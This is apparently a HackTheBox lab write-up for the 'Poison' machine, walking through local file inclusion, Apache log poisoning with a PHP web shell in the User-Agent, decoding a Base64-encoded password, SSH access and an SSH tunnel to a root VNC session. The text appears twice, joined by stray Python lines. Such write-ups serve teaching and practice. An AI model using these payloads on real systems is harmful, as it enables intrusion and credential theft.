# HackTheBox Writeup: Poison

| Field | Value |
|---|---|
| **Machine** | Poison |
| **Operating System** | FreeBSD 11.1 |
| **Difficulty** | Medium |

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Initial Foothold — LFI and Log Poisoning](#2-initial-foothold--lfi-and-log-poisoning)
3. [User Access — SSH](#3-user-access--ssh)
4. [Privilege Escalation — VNC](#4-privilege-escalation--vnc)
5. [Attack Path Summary](#5-attack-path-summary)

---

## 1. Enumeration

We start with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- <IP>
```

The scan reveals two open ports:

| Port | Service |
|---|---|
| `22/tcp` | OpenSSH 7.5 (FreeBSD) |
| `80/tcp` | Apache httpd 2.4.29 (FreeBSD) |

Navigating to the web server at `http://<IP>` reveals a simple page and reveals several interesting files:

- `browse.php`
- `listfiles.php`
- `info.php`
- `phpinfo.php`
- `pwdbackup.txt`

## 2. Initial Foothold — LFI and Log Poisoning

Inspecting `browse.php`, we can see that it takes a `file` parameter:

```text
browse.php?file=
```

This parameter is vulnerable to Local File Inclusion (LFI). Attempting to read `/etc/passwd` is successful:

```text
http://<IP>/browse.php?file=/etc/passwd
```

### Log poisoning

We can attempt to escalate the LFI to Remote Code Execution (RCE) through Apache log poisoning. The access log is located at:

```text
/var/log/httpd-access.log
```

**Important note:** FreeBSD's Apache log wraps User-Agent values in double quotes. If we inject a PHP payload containing double quotes (for example, `$_GET["cmd"]`), the PHP parser will encounter a syntax error (`T_CONSTANT_ENCAPSED_STRING`). To avoid this, the payload uses an unquoted array key, such as `$_GET[c]`.

We poison the log by sending a request with a PHP payload in the User-Agent:

```bash
curl -s -A '<?php system($_GET[c]); ?>' http://<IP>/
```

We then trigger the payload through the LFI:

```text
http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id
```

The command executes as the `www` user, confirming RCE.

Using this access, we read `pwdbackup.txt` from the webroot:

```text
http://<IP>/browse.php?file=/var/log/httpd-access.log&c=cat+pwdbackup.txt
```

The file contains a string encoded in Base64 multiple times. Its comment says:

> This password is secure, it's encoded atleast 13 times.. what could go wrong really..

We can decode it in Python:

```python
import base64

pwd = open("pwdbackup.txt", "r").read().strip()

for i in range(13):
    pwd = base64.b64decode(pwd)

print(pwd.decode())
```

This reveals the SSH password for the user `charix`:

```text
Charix!2#4%6&8(0)
```

## 3. User Access — SSH

With the credentials in hand, we log in via SSH:

```bash
ssh charix@<IP>
# Password: Charix!2#4%6&8(0)
```

Once logged in, we retrieve the user flag:

```bash
cat /home/charix/user.txt
```

## 4. Privilege Escalation — VNC

Inside `/home/charix`, we notice a `secret.zip` archive:

```bash
file secret.zip
# secret.zip: Zip archive data, at least v2.0 to extract
```

We extract it using the same SSH password. Inside is a file named `secret` containing eight bytes of non-printable data.

Checking running processes and listening ports with `sockstat -4 -l` or `ps aux`, we find that **Xvnc** is running as **root** on `127.0.0.1:5901`:

```text
root Xvnc 550 1 tcp4 127.0.0.1:5901 *:*
```

This indicates that a VNC server is running as root and is accessible only through localhost. The extracted `secret` file is the encrypted VNC password file, typically found at `~/.vnc/passwd`.

### SSH port forwarding

To access the VNC server, we create an SSH tunnel. Port `5901` might already be in use on the attack machine, so we forward it to local port `5902`:

```bash
ssh -L 5902:127.0.0.1:5901 charix@<IP>
```

We then connect to the VNC server using the extracted password file:

```bash
vncviewer 127.0.0.1::5902 -passwd secret
```

Alternatively, the VNC password can be decrypted using `vncpwd`, resulting in:

```text
VNCP@$$!
```

Authentication succeeds, and we are greeted with the root user's X desktop. We open an Xterm window and retrieve the root flag:

```bash
cat /root/root.txt
```

## 5. Attack Path Summary

1. **Enumeration:** Nmap identifies SSH and Apache.
2. **LFI:** The `file` parameter in `browse.php` allows reading local files.
3. **Log poisoning:** A PHP payload is written to the Apache access log and executed through the LFI.
4. **Credential discovery:** The repeatedly Base64-encoded backup reveals `charix`'s SSH password.
5. **User access:** SSH provides access as `charix`.
6. **Privilege escalation:** The extracted VNC password file and an SSH tunnel provide access to the root-owned VNC desktop.
7. **Root:** Retrieve `/root/root.txt` from the root desktop session.
"""

path = Path("/mnt/data/HTB_Poison_Writeup.md")
path.write_text(content, encoding="utf-8")
print(f"Created: {path} ({path.stat().st_size} bytes)")
from pathlib import Path

content = r"""# HackTheBox Writeup: Poison

| Field | Value |
|---|---|
| **Machine** | Poison |
| **Operating System** | FreeBSD 11.1 |
| **Difficulty** | Medium |
| **Target IP** | `<IP>` |

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Initial Foothold — LFI and Log Poisoning](#2-initial-foothold--lfi-and-log-poisoning)
3. [User Access — SSH](#3-user-access--ssh)
4. [Privilege Escalation — VNC](#4-privilege-escalation--vnc)
5. [Attack Path Summary](#5-attack-path-summary)

---

## 1. Enumeration

We start with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- <IP>
```

The scan reveals two open ports:

| Port | Service |
|---|---|
| `22/tcp` | OpenSSH 7.5 (FreeBSD) |
| `80/tcp` | Apache httpd 2.4.29 (FreeBSD) |

Navigating to the web server at `http://<IP>` reveals a simple page. Directory fuzzing with Gobuster reveals several interesting files:

- `browse.php`
- `listfiles.php`
- `info.php`
- `phpinfo.php`
- `pwdbackup.txt`

## 2. Initial Foothold — LFI and Log Poisoning

Inspecting `browse.php`, we can see that it takes a `file` parameter:

```text
browse.php?file=
```

This parameter is vulnerable to Local File Inclusion (LFI). Attempting to read `/etc/passwd` is successful:

```text
http://<IP>/browse.php?file=/etc/passwd
```

### Log poisoning

We can attempt to escalate the LFI to Remote Code Execution (RCE) through Apache log poisoning. The access log is located at:

```text
/var/log/httpd-access.log
```

**Important note:** FreeBSD's Apache log wraps User-Agent values in double quotes. If we inject a PHP payload containing double quotes (for example, `$_GET["cmd"]`), the PHP parser will encounter a syntax error (`T_CONSTANT_ENCAPSED_STRING`). To avoid this, the payload uses an unquoted array key, such as `$_GET[c]`.

We poison the log by sending a request with a PHP payload in the User-Agent:

```bash
curl -s -A '<?php system($_GET[c]); ?>' http://<IP>/
```

We then trigger the payload through the LFI:

```text
http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id
```

The command executes as the `www` user, confirming RCE.

Using this access, we read `pwdbackup.txt` from the webroot:

```text
http://<IP>/browse.php?file=/var/log/httpd-access.log&c=cat+pwdbackup.txt
```

The file contains a string encoded in Base64 multiple times. Its comment says:

> This password is secure, it's encoded atleast 13 times.. what could go wrong really..

We can decode it in Python:

```python
import base64

pwd = open("pwdbackup.txt", "r").read().strip()

for i in range(13):
    pwd = base64.b64decode(pwd)

print(pwd.decode())
```

This reveals the SSH password for the user `charix`:

```text
Charix!2#4%6&8(0)
```

## 3. User Access — SSH

With the credentials in hand, we log in via SSH:

```bash
ssh charix@<IP>
# Password: Charix!2#4%6&8(0)
```

Once logged in, we retrieve the user flag:

```bash
cat /home/charix/user.txt
```

## 4. Privilege Escalation — VNC

Inside `/home/charix`, we notice a `secret.zip` archive:

```bash
file secret.zip
# secret.zip: Zip archive data, at least v2.0 to extract
```

We extract it using the same SSH password. Inside is a file named `secret` containing eight bytes of non-printable data.

Checking running processes and listening ports with `sockstat -4 -l` or `ps aux`, we find that **Xvnc** is running as **root** on `127.0.0.1:5901`:

```text
root Xvnc 550 1 tcp4 127.0.0.1:5901 *:*
```

This indicates that a VNC server is running as root and is accessible only through localhost. The extracted `secret` file is the encrypted VNC password file, typically found at `~/.vnc/passwd`.

### SSH port forwarding

To access the VNC server, we create an SSH tunnel. Port `5901` might already be in use on the attack machine, so we forward it to local port `5902`:

```bash
ssh -L 5902:127.0.0.1:5901 charix@<IP>
```

We then connect to the VNC server using the extracted password file:

```bash
vncviewer 127.0.0.1::5902 -passwd secret
```

Alternatively, the VNC password can be decrypted using `vncpwd`, resulting in:

```text
VNCP@$$!
```

Authentication succeeds, and we are greeted with the root user's X desktop. We open an Xterm window and retrieve the root flag:

```bash
cat /root/root.txt
```

## 5. Attack Path Summary

1. **Enumeration:** Nmap identifies SSH and Apache.
2. **LFI:** The `file` parameter in `browse.php` allows reading local files.
3. **Log poisoning:** A PHP payload is written to the Apache access log and executed through the LFI.
4. **Credential discovery:** The repeatedly Base64-encoded backup reveals `charix`'s SSH password.
5. **User access:** SSH provides access as `charix`.
6. **Privilege escalation:** The extracted VNC password file and an SSH tunnel provide access to the root-owned VNC desktop.
7. **Root:** Retrieve `/root/root.txt` from the root desktop session
